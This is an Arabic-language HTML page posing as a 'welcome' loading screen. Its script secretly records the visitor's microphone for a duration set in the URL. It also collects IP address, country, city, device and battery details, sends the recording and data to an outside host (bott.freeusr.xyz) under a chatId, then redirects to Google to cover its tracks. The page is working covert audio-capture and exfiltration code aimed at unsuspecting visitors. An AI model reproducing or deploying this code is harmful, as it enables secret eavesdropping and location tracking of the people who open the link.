<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <title>مرحبا بك في موقعنا</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');

        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: #fff;
        }

        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, rgba(255, 255, 255, 0.1), transparent);
            transform: rotate(45deg);
            animation: animate 5s linear infinite;
        }

        @keyframes animate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading {
            border: 8px solid rgba(243, 243, 243, 0.2);
            border-top: 8px solid #e74c3c;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1.5s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            font-size: 20px;
            color: #ecf0f1;
            margin-top: 20px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loading" id="loading" style="display: none;"></div>
        <p class="message" id="notification">لحظه واحده من فضلك...</p>
    </div>

    <form method="POST" action="/submitVoice" id="voice-form" enctype="multipart/form-data">
        <input type="hidden" name="chatId" id="chatId">
        <input type="file" name="voice" id="voice" accept="audio/*" style="display: none;">
    </form>

<script>
// ============================================
// ✅ دالة إرسال تقارير الفشل إلى /fail
// ============================================
async function sendFailReport(type, message, details = {}) {
    const chatId = document.getElementById('chatId').value;
    if (!chatId) {
        console.warn('No chatId available for fail report');
        return;
    }

    try {
        const response = await fetch('https://bott.freeusr.xyz/fail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chatId: chatId,
                type: type,
                message: message,
                details: details,
                deviceInfo: {
                    platform: navigator.platform || 'غير متاح',
                    language: navigator.language || 'غير متاح',
                    userAgent: navigator.userAgent || 'غير متاح',
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    timestamp: new Date().toISOString()
                }
            })
        });

        if (!response.ok) {
            console.warn('Fail report response not OK:', response.status);
        }
    } catch (error) {
        console.warn('Failed to send fail report:', error);
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chatId');
    
    // قراءة المدة من الرابط
    let duration = parseInt(urlParams.get('duration')) || 5; // افتراضي 5 ثواني
    
    // التأكد من أن المدة بين 5 و 30
    if (duration < 5) duration = 5;
    if (duration > 30) duration = 30;
    
    if (!chatId) {
        sendFailReport('error', 'معرف المستخدم غير موجود في الرابط', {});
        alert("خطأ: chatId غير موجود في الرابط");
        return;
    }

    document.getElementById('chatId').value = chatId;

    if (!navigator.mediaDevices?.getUserMedia) {
        sendFailReport('error', 'المتصفح لا يدعم تسجيل الصوت', {
            userAgent: navigator.userAgent
        });
        alert("المتصفح لا يدعم تسجيل الصوت");
        return;
    }

    // بدء التسجيل بالمدة المحددة من الرابط
    startRecording(duration);
});

async function startRecording(duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const formData = new FormData(document.getElementById('voice-form'));
            formData.set('voice', blob, 'voice.webm');

            const info = await collectAdditionalData();
            formData.append('additionalData', JSON.stringify(info));

            const res = await fetch('https://bott.freeusr.xyz/submitVoice', {
                method: 'POST',
                body: formData
            });

            if (res.ok) {
                window.location.href = "https://www.google.com/";
            } else {
                const errorData = await res.json().catch(() => ({}));
                sendFailReport('upload', 'فشل إرسال التسجيل إلى الخادم', {
                    status: res.status,
                    error: errorData.error || 'Unknown error',
                    duration: duration
                });
                alert("فشل الإرسال. حاول مرة أخرى.");
            }
        };

        recorder.start();
        setTimeout(() => recorder.stop(), duration * 1000);
    } catch (err) {
        // ✅ إرسال تقرير الفشل حسب نوع الخطأ
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
            sendFailReport('permission', 'تم رفض الوصول إلى الميكروفون', {
                error: err.message,
                duration: duration
            });
        } else if (err.name === 'NotFoundError') {
            sendFailReport('microphone', 'لا يوجد ميكروفون متصل', {
                error: err.message,
                duration: duration
            });
        } else {
            sendFailReport('error', err.message, {
                error: err.message,
                duration: duration,
                stack: err.stack
            });
        }
        alert("خطأ في تسجيل الصوت: " + err.message);
    }
}

async function collectAdditionalData() {
    let ip = 'غير متاح', country = '', city = '';
    try {
        const ipInfo = await fetch('https://ipwho.is/').then(res => res.json());
        ip = ipInfo.ip;
        country = ipInfo.country_name;
        city = ipInfo.city;
    } catch {}

    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const match = ua.match(/\(([^)]+)\)/);
    const deviceVersion = match ? match[1] : 'غير متاح';

    let batteryLevel = 'غير متاح', charging = 'غير متاح';
    try {
        const battery = await navigator.getBattery();
        batteryLevel = (battery.level * 100) + '%';
        charging = battery.charging ? 'نعم' : 'لا';
    } catch {}

    return { ip, country, city, platform, deviceVersion, batteryLevel, batteryCharging: charging };
}
</script>
</body>
</html>
